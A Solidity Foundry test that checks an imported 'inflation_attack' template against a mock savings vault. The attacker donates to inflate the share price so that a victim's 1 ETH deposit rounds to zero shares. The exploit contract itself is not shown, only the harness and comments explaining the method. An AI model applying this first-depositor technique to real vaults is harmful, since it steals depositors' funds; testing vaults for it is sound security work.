// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockSavingsVault.sol";
import "../src/attacks/inflation_attack.sol";

/**
 * @title InflationAttackTest
 * @notice Proves the `inflation_attack` template: first depositor donates to
 *         inflate the share price, so the victim's deposit rounds to 0 shares.
 */
contract InflationAttackTest is Test {
    MockSavingsVault public vault;
    InflationAttack public attacker;

    function setUp() public {
        vault = new MockSavingsVault(address(this));
        attacker = new InflationAttack(address(vault));
    }

    function testInflationAttack() public {
        // Attacker is the first depositor: 1 wei + 10 ETH donation
        vm.deal(address(attacker), 10 ether);
        attacker.attack{value: 10 ether}();

        // Victim deposits 1 ETH -> rounds to 0 shares (all value stolen)
        uint256 shares = vault.deposit{value: 1 ether}(1 ether, address(this));
        assertEq(shares, 0, "victim should receive 0 shares");

        // Share price is now massively inflated
        assertGt(vault.convertToAssets(1 ether), 10 ether, "share price inflated");
    }
}
